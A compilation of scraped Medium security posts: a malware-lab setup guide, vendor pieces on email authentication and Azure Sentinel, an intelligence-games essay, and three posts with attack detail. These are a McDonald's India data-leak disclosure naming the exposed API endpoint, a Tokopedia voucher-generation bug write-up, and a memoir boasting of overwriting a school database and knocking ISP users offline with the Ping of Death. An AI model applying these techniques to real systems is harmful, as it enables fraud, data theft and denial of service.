The output will tell you where log files etc are stored and that the simulation is running successfully, including IP address and Process info. The usual CTRL+C to close. If you go to a web browser and open up the IP address of the server your iNetSim is running on you should see something like this:
If you see that, its working, well done! Now lets move over to our setup and fully licensed (right..) windows box…
OK so youve got your windows box all setup, make sure youre entirely up to date with your windows patches, you don’t want windows update shitting up your network traffic, because oh boy does it.
Ya ready for another set of links and applications to download? Go grab these:
WireShark — https://www.wireshark.org/Wireshark is a network protocol analysis tool that allows you — in quite some depth — to look at the traffic passing over your network interfaces. This is going to be critical for identifying if your malware is trying to phone home.
CFF Explorer — http://www.ntcore.com/exsuite.phpCFF Explorer is part of a suite of tools that will allow you to view the internal structure of a PE, and will parse out important information such as compile dates, imports and exports.
PEView — http://wjradburn.com/software/PEview.zipSimilar to CFF Explorer above PEView will let you view the structure of a Portable Executable.
WinRAR — http://www.rarlab.com/download.htmYou may be wondering, wtf is winrar doing on this list.. why do we want an archiving tool? So many instances of common and APT malware have been dropped by Self Executing Archives and WinRAR is the only tool that will comprehensively show you the comment section of the RAR file that contains the SFX instructions.
010 Editor — https://www.sweetscape.com/010editor/010 Editor is a fantastic text, hex, binary editor. frankly outstanding. It is however not free. There is a 30d trial available. Give it a shot, I found it well worth the purchase.
ILSpy — http://ilspy.net/Beautiful little .NET disassembler, takes most .NET executable, gives you some lovely code. Just what mamma ordered.
And finally what is probably the most useful selection of tools that you can have the Windows SysInternals tool set — You can create a shortcut on the desktop that links to this URL:
https://live.sysinternals.com/
The tools we will be using from this selection are:
There are numerous other tools that will be helpful and when we start to dig into actual analysis, I may end up referencing some of those and Ill give you download links at the time. Dealing with Word docs and OLE objects is a prime example where other utilities will be useful.
When you’re done downloading and installing the applications above, set the primary DNS server for your network interface (within the guest OS) to be the IP address of the iNetSim server we setup earlier.
Now if you try to go to google for example, you should be routed to the Fake Website that we saw earlier.
Finally the last action we want to take on both of the machines we have setup at this point, is to create snapshots of them using our Virtual Machine Hypervisor. I advocate for good and obvious naming schemes so I get the following:
Performing snapshots like this allows us to quickly and easily return our environment to a known good state, this is super important when you consider what kind of tools we could be looking at and running in this VM.
*** It is highly advised at this point you go into your VM settings for both the iNetSim Simulator and the Windows Analysis machine and ensure that they are in Host Only networking mode, and that their IP addressing allows them to communicate — Re-take a snapshot after you have confirmed this ***
Trust me, you don’t wanna be looking at something that could potentially pull down an SMB spreading ransomware (topical huh..) and encrypt your entire media NAS…
Congratulations, you’ve setup a Malware Analysis lab. You’ve got a secure environment to run dodgy files and tools to look at them.
Ill be back in a few days with another article which will essentially be a walk through analysis of some malware, we can see what funkyness we can identify via these tools. In the mean time if you’re bored, Procmon.exe is worth a look ;)
See you then!
Written by
","['Infosec', 'Security', 'Malware', 'Ubuntu', 'Cybersecurity']"
Marketers Take Note: Gmail Might Turn You into a Question Mark,https://medium.com/@valimail/marketers-beware-gmail-might-turn-you-into-a-question-mark-251dca560cb3?source=tag_archive---------5-----------------------,"Getting email authentication right just got a lot more important.
Google’s Gmail team announced this week that it would be rolling out two changes in the way that Gmail displays email messages to its web users. The first change: If you’re reading email from (or sending email to) someone whose servers don’t support TLS encryption, you’ll see a broken lock icon.
But the second change is a much bigger deal: If you receive a message whose sender can’t be authenticated, you’ll see a question mark in place of the sender’s photo, logo, or avatar.
It’s that second change that should have anyone who relies on email for marketing or customer communications sitting bolt upright and paying close attention. Never mind how much work you’ve done building trust with your customers and prospects. Never mind how many opt-ins they’ve given you, or how much care you put into crafting your email messages and making sure that their formatting is on-brand. If those messages don’t authenticate, they’ll have a big, bold question mark right next to them in Gmail.
Google is careful not to say that this means every message with a question mark is suspect. “Not all affected email will necessarily be dangerous,” Google writes. “But we encourage you to be extra careful about replying to, or clicking on links in messages that you’re not sure about.”
But there’s no question that Google is injecting a note of doubt into recipients’ minds. (Not to mention blocking out the more customer-friendly logo or avatar that ordinarily represents your company in people’s inboxes.) Not exactly the move you want to make when you’re trying to establish a relationship of trust with the people to whom you’re selling.
Google is making this move now because phishing attacks have reached epidemic proportions. Just this week, for instance, we learned that a single gang of cybercriminals successfully used phishing attacks against about 670 victims, getting them to install malware and then pay to have it removed. That one attack cost the victims $330,000 in Bitcoins.
The phishing problem is so bad that the FTC even recently put out a warning to U.S. citizens to be alert for fake emails from the Social Security Administration.
Unfortunately, the usual warnings to watch out for fake emails don’t solve the problem. In fact, they make it worse, because they teach users to be suspicious of your emails.
Authentication is quite simply the most effective and authoritative way to stop email phishing, because it prevents fraudsters from sending messages that appear to be from other sources. It puts an end to scammers impersonating the Social Security Administration, or Target, or Walmart, or anyone else. With authentication, you know that the sender really is who the email says it is.
Showing question marks for non-authenticated email senders is just the latest in a series of steps Google has been taking to support and enforce email authentication. It’s not the only one: Yahoo! Mail, AOL Mail, and Microsoft’s Hotmail all support authentication too.
And Microsoft has announced it will begin flagging non-authenticated email soon.
For now, Google’s authentication effort is focused on two core authentication standards, SPF and DKIM. Eventually, it will likely move to support a more modern standard, DMARC, that incorporates both SPF and DKIM and ties them together in a way that’s even harder to spoof.
The problem for marketers is that most IT departments have struggled to implement email authentication correctly. It’s not enough to implement SPF and DKIM: You have to implement them correctly, or Gmail will flag your messages as non-authenticated. It’s not easy: Read our blog post on the four most frequent email authentication mistakes, and our post on two common problems people have with SPF.
How does your domain measure up? Use our easy tool to check whether authentication is working for your domain.
With its innovative approach, ValiMail can automate — and maintain— email authentication for you. With our system:
Marketers will be happy because their emails will get get better deliverability, brand protection, and consumer protection. And there will be no scary question marks next to their messages in Gmail.
Messaging teams will benefit from ValiMail because our system gives them visibility and control over not just email authentication, but who is actually authorized to send messages on the organization’s behalf.
Security executives will be pleased with ValiMail because authentication makes it much harder for scammers to spoof emails, thus increasing protection both customers and employees.
Find out more about ValiMail at www.valimail.com or write to us at info@valimail.com.
Written by
","['Cybersecurity', 'Email Marketing', 'Authentication']"
Marketing Is Ravaging Cybersecurity - Command Line,https://blog.secureset.com/marketing-is-ravaging-cybersecurity-1135d5a1d5c4?source=tag_archive---------5-----------------------,"It’s an interesting thing to see an industry approach a dangerous inflection point. If you focus closely, you can actually smell the vapor. What’s concerning — what should scare people — is that today’s industry on the verge of a concern is cybersecurity. It affects us all because it is perhaps one of the most indispensable fields in our connected society. But we can confront this problem. We can do a better job by focusing on engineering, solutions development, and marketing — in that order.
For years, people have said that cybersecurity is a bubble market. But most of those people are analysts, bankers, or consultants. Their incentives are aligned to promote incumbents who want people to believe that only they have the answers. I have and still do actually work in the field. Together, my business partner Dave Odom and I manage an early-stage product development, sales, and investment platform. We’re the guys who should be against the bubble rhetoric. But it is easy to see what is happening: marketing is fully overtaking product development. We’ve lined up to go to the mattresses to rebalance the equation.
I recently had the opportunity to attend the RSA Conference 2017. This is a great conference with important value. But what I saw from companies exhibiting on the showroom floor was messy.
Walking the expo, I became more frustrated with every step. I saw a litany of copy-cat products, waves laser light shows, and a rows of chintzy branding. There was a lot of marketing going on—and not all of it good. But what I failed to find much of was novel engineering.
In the years that I’ve been attending trade shows, I’ve seen an inverse correlation between the amount of marketing spending and the level of technical innovation. Even though we’ve come far in what we can do — we have not made great progress in what we are doing.
Here’s a precision accurate cyber-chart based on exclusive and proprietary data and customer insights to illustrate this problem (that text is nearly identical to one I saw yesterday).
When products lack innovation and differentiation, the bar is lowered for attackers. Suspiciously common engineering begets the same monoculture dangers as the inbred aristocracy of yore. Overcoming them gets progressively easier with each new target. And trust me, monocultures have been the end of empires before.
The spending war in marketing is making it difficult for cybersecurity companies to enter the market without a seasoned and trusted partner. Don’t get me wrong, great creative cannot be overrated but it must be matched with great engineering, product development, and customer development.
Firms of all sizes underfund their engineering and product budgets to pay for conference lanyards (a cool quarter million), slick airport placement ads, and fantastically lavish booths. I saw everything from magicians and pole dancers to laser light shows and small movie theaters on the showroom floor. One company even went so far as to develop a video game of how their cyber product cyber-roundhouse kicks cyber hackers in cyberspace. Cyber cyber cyber…threat threat threat. Terrible.
Purchasers of cybersecurity products need to step up. Customers need to push back against companies that are all brand — no product. They need to call out vapor-ware as being simply that.
Firms that spend vastly more on marketing than they do on product development and engineering have created a problem. Spending hundreds of thousands of dollars on ridiculous ploys like viking helmets leads to implosive outcomes.
Companies that raise tens of millions of dollars and put nearly all of it into marketing believe that their customers can be swindled into buying sub-standard products. A particular Viking God-based company raised more than $40 million to develop their flagship “threat map,” which in its live version has the same utility as simply looking at this static picture. It took years for the market to reject this company and, in the interim, they signaled to others that you can fuel a company on vapor for nearly half a decade — scaring off investors from this market along the way.
To be clear, I think marketing is important. It does drive the company, generate revenue, and makes people sit up and listen. Marketing can propel a thesis, a capability, or a company into the world.
Campaigns such as Chrysler’s Imported From Detroit can fundamentally change the way consumers view a company. And there is great marketing and creative in cybersecurity — it just needs to be matched by great engineering. That said, building a brand adds incredible value and resiliency to a firm — and that cannot be minimized.
Here’s the deal though: the full on cybersecurity marketing-gasm is totally and absolutely screwing with reality. It’s making us bad at our jobs by promoting brochure engineering and forcing new entrants to underinvest in product. We need to get back to a reasonable equilibrium between marketing and product capabilities.
One of the reasons why the SecureSet Accelerator exists is to address this problem. We stand for product-focused entrepreneurs as first class citizens. To promote them, we directly connect buyers with innovators. This supports the product development and sales goals of startups and ensures enterprise customers get the capabilities they need to succeed. We invest in product teams and take a principled engineering approach to our investment thesis. In fact, we only accept and invest in companies working to address key problems with novel technology. It is our job to pull out the signal from the noise.
Are we tilting at windmills in some sort of quixotic adventure — absolutely not. The companies doing the coolest and most important work in cybersecurity are also the ones that are most highly valued. Solving actual problems is both great for cybersecurity and business.
Good for you! We support you. But please follow these three simple rules:
Trust your instincts and build something great. Let the product speak for itself. When it does, then tell everyone about it.
We’ll see you at RSA Conference 2018. #CyberAllTheThings
— Alex Kreilein
I write about technology, cybersecurity, startups, and the human experience. I am also a Managing Partner with the SecureSet Accelerator. If you are building exciting cybersecurity or enabling technology products, come Join Us for an immersive experience where we bring customers into iterative product builds and drive rapid market traction!
Written by
","['Careers', 'Cyber Topics', 'For Students', 'By Students', 'Archive', 'About SecureSet', 'Cybersecurity', 'Investing', 'Security', 'Marketing', 'Secureset Accelerator']"
McDonalds India is leaking 2.2 million users data - HackerNoon.com - Medium,https://medium.com/hackernoon/mcdonalds-india-is-leaking-2-2-million-users-data-d5758b2eb3f8?source=tag_archive---------5-----------------------,"UPDATE2: The McDonald’s fix is incomplete and the endpoint is still leaking data. We have communicated this again to them and are waiting for their response.
UPDATE1: McDonald’s India has replied to us that they have fixed the issue and would be releasing an official statement urging their users to upgrade the app.
The McDonald’s India app, McDelivery is leaking personal data for more than 2.2 million of its users which includes name, email address, phone number, home address, accurate home co-ordinates and social profile links. We contacted McDelivery on 7th Feb and received an acknowledgement from a Senior IT Manager on 13th Feb (33 days ago). The issue has not been fixed yet and our continued effort to get an update for the fix after the initial acknowledgement has failed.
An unprotected publicly accessible API endpoint for getting user details coupled with serially enumerable integers as customer IDs can be used to obtain access to all users personal information.
The lack of strong data protection and privacy laws or penalties in India, unlike the European Union , United States or Singapore has led to companies ignoring user data protection. There is a similar lack of push from non-government organisations to improve this scenario. We have in the past discovered more than 50 instances of data leaks in several Indian organisations. In fact, we are pleasantly surprised when we find Indian companies without a personal or payment data leak vulnerability in their APIs.
API Endpoint : http://services.mcdelivery.co.in/ProcessUser.svc/GetUserProfile
A sample response to the curl request:
Disclosure Timeline:
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
","['About', 'Help', 'Go Home', 'Privacy', 'Cybersecurity', 'India', 'Startup', 'Technology']"
Membuat voucher code dan menggunakannya untuk menambah saldo Tokocash,https://medium.com/@arifmukhlis/membuat-voucher-code-dan-menggunakannya-untuk-menambah-saldo-tokocash-7c60520d5941?source=tag_archive---------8-----------------------,"Hari ini saya mau membagikan POC vulnerability yang saya temukan pada tokopedia.
Beberapa waktu lalu tokopedia membuat fitur baru , fitur tersebut di beri nama Tokopoints . Pada fitur tersebut memungkinkan pengguna untuk menukarkan point mereka dengan sebuah kupon (cashback, gratis ongkir dll). Point bisa di dapat setelah pengguna berhasil melakukan transaksi .
Pada fitur itu terdapat juga beberapa level member yaitu classic member, silver, gold dan platinum. Dan disitu di berikan juga kupon gratis yang dimana akun dengan level classic member bisa menukarkan 0 point mereka untuk mendapatkan gratis ongkir Rp 20.000
Vulnerability yang saya temukan berawal dari kupon gratis ini , vulnerability ini memungkinkan seseorang (siapa saja) dapat meng generate code voucher secara terus menerus dan vouchernya bisa di redeem untuk menambah saldo tokocash, karena tidak ada nya pengecekan point, maka member dengan 0 point pun bisa menggenerate voucher cashback tokocash.
Saya mencoba untuk menukarkan 0 point yang saya miliki untuk mendapatkan kupon gratis ongkir dan tidak lupa mengaktifkan burp suite untuk meng capture data yang akan dikirim.
Setelah berhasil menukar point dengan kupon lalu saya cek pada burp suite dan mengirim data melalui brup suite dengan harapan kupon bisa saya dapatkan lagi, Tapi itu tidak work � �
Disitu terlihat data berbentuk json yang akan dikirimkan, pada bagian catalog_id saya mencoba menggantinya dengan berbagai angka acak mulai dari 2,0,7,4,100 dst , yang saya dapat justru error pada response � � , kecuali id 0 .
Response tersebut saya dapatkan ketika mengubah nilai catalog_id menjadi 0 � �
Karena tidak ada deskripsi atau keterangan nya maka saya tidak tahu kalau data tersebut adalah data voucher, R25LVHAK2U91
karena biasanya voucher code seperti ini (misalnya: MOTOR500, BANTOKPED dll) .
Setelah beberapa menit bingung � akhirnya saya memutuskan untuk mencoba menggunakan nya pada halaman Checkout ,
Promo ini hanya dapat digunakan di Redeem Voucher. Yesss, saya baru tahu ketika mendapat pesan tersebut dan menyimpulkan bahwa itu adalah benar benar voucher valid �
Selanjutnya saya mencari tempat untuk redeem voucher itu , dan saya menemukan ini https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/ dari sinilah voucher gift card dapat menjadi balance tokocash.
Perlu diketahui bahwa 1 voucher nominalnya Rp 100.000 dan itu bisa di generate terus menerus ,walau saya hanya menggenerate beberapa saja untuk testing,tapi perkiraan saya sih tidak ada batas nya �
Setelah berhasil membuat POC dan memastikan bahwa ini benar benar sebuah masalah , maka saya langsung melaporkannya .
Tokopedia merespon cepat dan langsung memperbaiki vulnerability ini hanya dalam waktu kurang dari 3 jam setelah email laporan saya kirim.
dan tokopedia menyatakan vulnerability ini masuk kategori critical severity.
Written by
","['Bug Bounty', 'Cybersecurity']"
Memoirs of an Amateur Hacker - Featured Stories - Medium,https://medium.com/s/story/hacking-deeds-done-dirt-cheap-906fd51b39c4?source=tag_archive---------6-----------------------,"Everything you read in this post is true. All of the hacking, all of the abuse of high school computer systems, everything. It all went down a long time ago in a galaxy not-so-far away during the early years of the PC revolution and the dawn of the internet.
It was 7:15 a.m. We were both nervous as hell. Would it work? Glancing at the clock again, I began to have my doubts. We had set the timer for things to start right around the time people would arrive at the school’s computer lab. But so far, nothing. Sweat appeared on our foreheads while I took another chance look across the hall at the entrance to the lab. Again, nothing. It was past the time we had set, and if we stayed any longer, we would be late for our first class. Silently admitting defeat, we started to walk away.
Beeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeep!!!!!!!!!!!
The tortured sound of over 25 Apple IIe computers all beeping loudly at the same time echoed down the hall. Trying as hard as we could to not break out in laughter, we beat a hasty retreat to the nearest stairwell to make our escape. Just before the stairwell door closed, I spotted one of the computer teachers bolting out of the lab, arms waving, yelling for someone to help stop all the racket.
We were evil. We were hackers. At least in our own minds.
We learned early that the best vulnerabilities could be found in the laziness of humans. The day before our auditory assault on the computer lab, we carefully hatched our master plan. It was simple. We wrote a small program that did two things: created the loudest beep possible from the tiny speaker of an Apple IIe computer while displaying images on the screen that we’d lifted from a crappy strip poker game. Both actions were set to trigger after a timer for 11 hours.
With the best hacks, you sometimes don’t even have to touch the keyboard yourself.
The challenge was getting our “hack” installed on each of the computers unnoticed while also preventing the machines from being shut down at the end of the day per the computer lab protocol. The solution for installing our software was easy — nobody ever asked what we were doing, so we just did it — but the shutdown fix was pure genius. You could tell when an Apple IIe computer was powered on by a small green light next to the keyboard. We simply placed a small square of beige paper over the power indicators. From a short distance, it perfectly hid that the machine was still on. We figured the teachers wouldn’t bother to inspect each machine beyond looking for the green light.
Other than our math for the timer being an hour off, the hack worked perfectly. We learned later that the chaos resulted in the lab being closed for an entire day, one teacher being completely traumatized, and a school-wide witch hunt for the perpetrators that lasted more than a week.
There is something supremely satisfying when chaos ensues from the actions of unwitting people. And with the best hacks, you sometimes don’t even have to touch the keyboard yourself.
I hated Pascal. The only reason I even took the class for it was because it was the most “advanced” programming class I could get into. Toward the end of it, we were allowed to write programs on the school’s mainframe system, in a restricted way, as a means to expose us to the world of Unix operating systems. To say this was a very bad idea would be a gross understatement.
The afternoon was dragging. A friend, let’s call him Bob, and I had already completed our assignments for the day and were messing around on the mainframe system. Bob was randomly looking through directories that we had read access to in a futile effort to make the clock go faster. Being new to Unix, we were still getting used to the idea that large portions of the system were visible to us although we had no permission to actually execute, delete, or otherwise modify anything we saw. Secure in the knowledge that we couldn’t really harm the system, we browsed the exposed directory structure with confidence.
At some point, Bob ran across a directory called “GRC.”
“Hey, what’s that?” I asked. I knew full well that GRC stood for Guidance Resource Center, but I had learned that Bob got skittish when presented with something that might actually be important, so I was playing dumb.
“Dunno, let’s check it out,” replied Bob.
Bob got into the directory and proceeded to list the contents. We both spotted a massive file called “GRCD.db.”
“Wow, that’s huge. Wonder what that is,” Bob said, leaning closer to the screen. With a devilish grin, I said, “I dare you to delete it.”
As we both realized what we had done, Bob’s face slowly drained of color. He kept re-listing the directory contents as if it might somehow bring it all back.
This was the usual game we played; we knew full well we didn’t have the permission to delete anything. Bob quickly typed the command, and with a dramatic pause he pressed the “enter” key.
“Permission denied.”
It was the result we had expected, and Bob was already moving on to something else when I had an idea: “What if we copy something over it with the same name?”
Before I could say anything more, Bob rapidly typed the command to copy one of the other files in the directory using the same name, GRCD.db. This time, there was no dramatic pause over the “enter” key as he smoothly executed the command. The ever-blinking cursor paused for about half a second and then nothing. No error message, nothing. Bob stared at the screen for what seemed like several minutes before he spoke.
“Oh shit. What just happened? Did we…” he sputtered.
He listed the contents of the directory. GRCD.db was still there, but it was no longer a huge file. As we both realized what we had done, Bob’s face slowly drained of color. He kept re-listing the directory contents as if it might somehow bring it all back.
We later learned that GRCD.db was the Guidance Resource Center database that contained all of the information that seniors were using to research potential colleges. It took the school over two weeks and god only knows how many hours of consulting time to restore the system to a usable state. Hopefully they learned something from that event; I know Bob did because he was found throwing up from nerves a few hours later. He never ratted, so I guess there’s that.
Macs during the ’90s were awesome. So easy to use, so graphical, so insecure. When my high school spent some real money to install a new lab full of Macintosh Plus computers, I was in heaven. These machines were a whole new world to explore, complete with something called a “file server.”
Back then, networking was a new concept, one that the majority of the school’s computer teachers and staff knew absolutely nothing about. They did what any large organization does; they farmed out the management of the new Mac lab to a consultant that visited rarely.
Several other students and I quickly realized we were able to save files on the server in various directories set up by the consultant. Never wanting to waste computing resources, we set about playing a game of who can contribute the most “material” to a carefully named folder buried several levels deep in the directory structure of the file server.
Bandwidth slowed to a crawl, making an already painful experience worse. Lucky for me, I had a solution.
This continued for several months until a message one day informed us the disk was full, preventing us from copying files to the folder, and we quickly lost interest in the game.
However, we neglected to remove the “material,” and it wasn’t long before the consultant was back to fix the “problem” plaguing the file server. It might have ended very badly because the Macs were much better at showing file and folder ownership than other systems in the lab. As it turned out, though, the consultant was a collector of fine “material.” Several people noticed him copying a large number of files onto an external drive before declaring that the “problem” had been solved.
Dial-up internet ruled during the ’90s. That metallic screech dominated my life as I spent hours online exploring and interacting with this amazing new resource. My first ISP was Delphi, a major step up from the Bulletin Board Systems (BBS) I had been using before then. Years later, better options came in the form of dial-up internet access provided through a then-local company called Cape Internet.
One of the downsides to dial-up internet, though, was how access was provided through points of presence (POPs), which were basically banks of modems connected to individual phone lines. Users would often dial into a local POP or be hit with long-distance phone charges, but the real hang-up (pun intended) was when the POPs filled up with connected users. Bandwidth slowed to a crawl, making an already painful experience worse. Lucky for me, I had a solution.
Hacking in the ’90s was fun in ways that just are not practical or safe today.
The Ping of Death was an ICMP ping that was larger than the standard 65,535 bytes. Using it against Windows computers of the time would cleanly knock out their TCP/IP software stack, with the effect of disconnecting users from the internet while not actually hanging up their modem. After a small amount of programming, I had a tool that would automatically grab the subnet and mask of my internet connection and then use the Ping of Death across the entire subnet. I even made it my dial-up login script, executing as soon as the connection was up and knocking everyone else connected to that POP offline but me.
It took Cape Internet several months to finally block ICMP on the POPs, and even after they did, it caused other issues, so I often found it re-enabled. It wasn’t until people started patching their Windows machines that my little trick finally became ineffective.
Hacking in the ’90s was fun in ways that just are not practical or safe today. Some of these hacks if done today would set off alarms and might even result in unpleasant encounters with law enforcement, but back then, it was dismissed as little more than annoying kids messing around (which it sort-of was).
I hope you enjoyed this little stroll down memory lane as much as I have, and I’ll leave you with one of my favorite quotes, by Emmanuel Goldstein:
What hackers do is figure out technology and experiment with it in ways many people never imagined. They also have a strong desire to share this information with others and to explain it to people whose only qualification may be the desire to learn.
Written by
","['Cybersecurity', 'Hacking', 'Technology', 'Memoir', 'Programming']"
Microsoft Azure Sentinel: not your daddy’s Splunk - Maarten Goet - Medium,https://medium.com/@maarten.goet/microsoft-azure-sentinel-not-your-daddys-splunk-3775bda28f39?source=tag_archive---------5-----------------------,"OK, I must admit; this title is misleading. I am not going to do a side by side comparison of Splunk and Azure Sentinel. Although that seems to be the thing that people on social media are talking about these days: how does Azure Sentinel compare to other SIEM solutions such as Splunk, etc.
Instead, I’ll be focusing on what role Azure Sentinel plays in securing your enterprise. And while Azure Sentinel does provide the advanced SIEM capabilities and dashboarding that many companies need, I really want you to understand the broader picture as Azure Sentinel, as a cloud security solution, is set to disrupt the SOC.
And with Microsoft owning and operating a big part of the technology you use every day in your workplace, along with making security a strategic investment and bet, I argue that they are becoming the biggest security company in the world.
Biggest security company in the world
Microsoft is investing heavily in security in recent years. Not only have they upped their game in finding and fixing product defects, they for instance also have a big organizational unit around threat intelligence (Microsoft Threat Intelligence Center). They are investing tens if not hundreds of millions in developing security products and solutions for their platforms.
And while one could argue that the early days of their AV solution were not watertight, they certainly turned around that “ship”, and Microsoft should not be underestimated if they are taking security seriously. If you look at their evolved EDR solution today, Windows Defender is not only achieving high scores, it also detects bad actors in ways and speed other vendors do not and cannot.
Because Microsoft’s owns both one of the two biggest cloud platforms in the world, as well as sell the most used cloud endpoint (Windows), they are poised to become the biggest security player in the world. On top of this, it can leverage its immense computing power to use machines learning and artificial intelligence to really make a difference in how security is approached.
You see this coming to life when you connect Windows Defender to their Azure cloud; you start to receive threat intelligence feeds, and new malware is detected and remediated through machine learning in under 14 minutes. This is why Defender ATP is growing very strong in adoption at enterprises in recent months.
Traditional SIEM’s and the cloud: a sour-sweet combination
As mentioned, Microsoft has an EDR solution called Windows Defender. But it has many more offerings. For instance, they also have specific solutions for protection your valuable data such as Cloud App Security and Office 365 ATP. They can protect your identity with Azure AD, and Azure ATP. Microsoft also has Azure Security Center to protect the assets that run on Microsoft Azure, and there are many more security solutions in their portfolio.
One thing that seemed to be lacking was a central orchestrator. A coordinator for all your security efforts. Something that ties this all together.
In the past years, enterprises would hook up the alerts that Microsoft security solutions were generating and forward them back to their on-premise SIEM solution as part of their cloud security strategy. But they are struggling to keep pace with the increasing volume and variety of data they process. Unhappy users complained about the inability of their SIEMs to scale and the volume of alerts they must investigate.
Enterprises struggling with the cost of data analysis and log storage often turn to open source tools like Elasticsearch, Logstash, and Kibana (ELK) or Hadoop to build their own on-premise data lakes. However, to gain useful insight from the data they collect, they realiz the expense of building and administering these “free” tools is just as great as the cost of commercial tools.
Sentinel, orchestrating your security efforts
This is where Azure Sentinel comes in; a central place to analyze your security data, across all parts of your environment. Cloud security solutions like Azure Sentinel are set to disrupt the SOC, Forrester concludes:
“This week, as thousands of security pros gather in San Francisco for RSA, tech titans Microsoft and Google (Alphabet) launch cyber security tools that promise to disrupt the traditional way of taking in and analyzing security telemetry. Chronicle Backstory (an Alphabet company) and Microsoft Sentinel are cloud-based security analytics tools that are addressing the challenges faced by SOC teams such as:
Chronicle and Microsoft are making these challenges cloud native with virtually unlimited compute, scale, and storage. These vendors have a unique advantage over legacy on-premise tools since they also own their cloud infrastructures and aren’t dependent on buying cloud at list price from would-be competitors.”
Connecting any and all clouds
One could lead to think that this will be an all-Microsoft centered approach. But nothing is truer. While Microsoft has not confirmed this publicly, they are indeed working with other cloud vendors to get their security data programmatically.
If you take a look at the Data Connections section of the Azure Sentinel preview, you already see a placeholder section for connecting the AWS CloudTrail data soon. I’ll write more about this in an upcoming blog.
The Intelligent Security Graph is at the center of this all
I’ve written about what Microsoft’s Intelligent Security Graph is before:
“Microsoft describes ISG as a way to ‘build solutions that correlate alerts, get context for investigation, and automate security operations in a unified manner.”
But with the release of Azure Sentinel, it really amplifies that strategy and makes it come to life. The intelligent security graph is a core piece of Sentinel’s backend to grab the relevant information from other Microsoft services such as Azure ATP, Defender ATP, Azure Security Center, etcetera.
But not only for Microsoft services. Exactly a year ago at RSA 2018, many vendors such as Palo Alto Networks, F5, Symantec, Fortinet and Check Point integrated their solutions into the intelligent security graph. Azure Sentinel leverages those technical integrations to get events from the network.
But not only network vendors integrate with Microsoft’s intelligent security graph. Well-known names such as Anomali, Sailpoint, Ziften and many others have joined the party recently.
Using the dashboards technology already available in Azure, Sentinel is able to provide you with a single pane of glass on the security of your environment. And because of the graph, it provides detailed out of the box drill-down dashboards for those network vendors, as part of your investigation.
Azure Firewall is the perfect example
But it doesn’t stop at getting even data from the network. Microsoft just announced new capabilities in its own Azure Firewall, most notably a feature called Threat intelligence-based filtering.
“Azure firewall can now be configured to alert and deny traffic to and from known malicious IP addresses and domains in near real-time. The IP addresses and domains are sourced from the Microsoft Threat Intelligence feed powered by The Microsoft Intelligent Security Graph.”
Threat intelligence-based filtering is default-enabled in alert mode for all Azure Firewall deployments, providing logging of all matching indicators. Customers can adjust behavior to alert and deny.
Democratizing AI: meet Azure Sentinel FUSION
Azure Sentinel features something Microsoft calls FUSION. As Microsoft is looking to democratize Artificial Intelligence, they are making it easy to use machine learning as part of your triage.
Instead of sifting through a sea of alerts, and correlate alerts from different products manually, ML technologies will help you quickly get value from large amounts of security data you are ingesting and connect the dots for you.
For example, you can quickly see a compromised account that was used to deploy ransomware in a cloud application. This helps reduce noise drastically.
Conclusion
I agree totally with Joseph Blankenship:
“For security pros that have been around awhile, don’t let your cynicism block the potential advantages your organization could experience by making use of Azure Sentinel. Take off the tinfoil hat and realize that Microsoft is a security company now. What Google and Microsoft have introduced will make the entire industry better, and that’s something to applaud.
The future of cybersecurity, just like the IT resources it protects, is in the cloud. The Tech Titans are staking out a claim and changing the way security solutions are purchased, delivered, and consumed… and it couldn’t come at a better time for the industry.”
Over the course of the next couple of weeks I’ll share my real-world experiences on Azure Sentinel with you in a multi-part blog series at http://www.maartengoet.org.
Part one will be about ‘design considerations for Azure Sentinel’. Stay tuned!
— Maarten Goet, MVP & RD
Written by
","['Azure', 'Microsoft Azure', 'Cybersecurity']"
Mind Games: International Championship - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/mind-games-international-championship-cc143febb793?source=tag_archive---------2-----------------------,"The “ShadowBrokers” dump of an NSA firewall ops toolkit continues to generate page views and outrage about how national intelligence agencies handle software vulnerabilities. This post won’t address that issue, but rather look at the sort of mind game calculus that goes on between the intelligence services. This international level mind game includes espionage, intelligence and counterintelligence all bundled together, very exciting to observe.
That NSA knows the toolkit was compromised is a secret which exposes a vulnerability in the foreign intelligence service — they do not know that NSA is aware the toolkit was compromised. Revealing this secret would patch the vulnerability in the foreign intelligence service — NSA’s opposition. Providing adversarial intelligence services with secrets is not in NSA’s mandate.
Nicolas Weaver has written a piece on Lawfare which ignores the intelligence calculus and just goes straight for “NSA should provide American companies with software QA assistance.” Personally, I’m not sure that is the mandate of an intelligence agency:
According to a Reuters exclusive, the NSA was aware that their tools may have been exposed almost immediately after it occurred, and yet never notified Cisco and Fortinet about the vulnerabilities in their system. There is a defensible argument for not informing a vendor about a zero-day where the Agency is confident nobody else knows about it. But if the NSA has reason to suspect an adversary has captured a zero-day — the use of which could substantially impact US interests — it is critical that the NSA report it to the vendors in the interest of defense. — Source
This analysis is simplistic and ignores the complexities of The Great Game. Here are the salient points that we’ll need to understand the sort of calculus the intelligence agencies have to go through as they deal with this situation:
From here, things get interesting…
The foreign intelligence service (FIS) can exploit the NSA’s firewall ops kit in a number of different ways, but they broadly fall into two categories — active and passive.
Active
Passive
Possibly more options, because this is certainly not an exhaustive list of how a FIS would derive value from a stolen cyber operations toolkit. The important point here is that passive exploitation for intelligence offers a lot of value even without actively using the contents in one’s own offensive cyber operations.
In a quick note against using the toolkit 0days, the FIS almost certainly has their own firewall ops kit. This kit will include 0days against Cisco and Fortinet (and Huawei, and so on.) Those 0days may, or may not, be the same ones that the NSA was using. There is almost no chance that the FIS needed those NSA 0day in order to operate (remember, this FIS was able to detect, trace and back hack an NSA operation — they’re pretty good with computers.)
Now we are ready to explore the calculus that intelligence services have to go through. Using the patchwork of information that they have available, they must try to determine the best solution to achieve their mission (in addition to all the other normal office politics and problems of bosses and budgets.)
This is where the mind games begin:
At this point, there some major vulnerabilities facing both the services.
Vulnerability: NSA
Their firewall ops kit is potentially compromised. Now what?
Vulnerability: FIS
Best Course of Action: NSA
Assume that the kit has been compromised and begin migrating to a new toolkit. Cease all operational usage of that kit against the FIS most likely in possession of the tools. Assume (some) past operations are compromised and proceed accordingly.
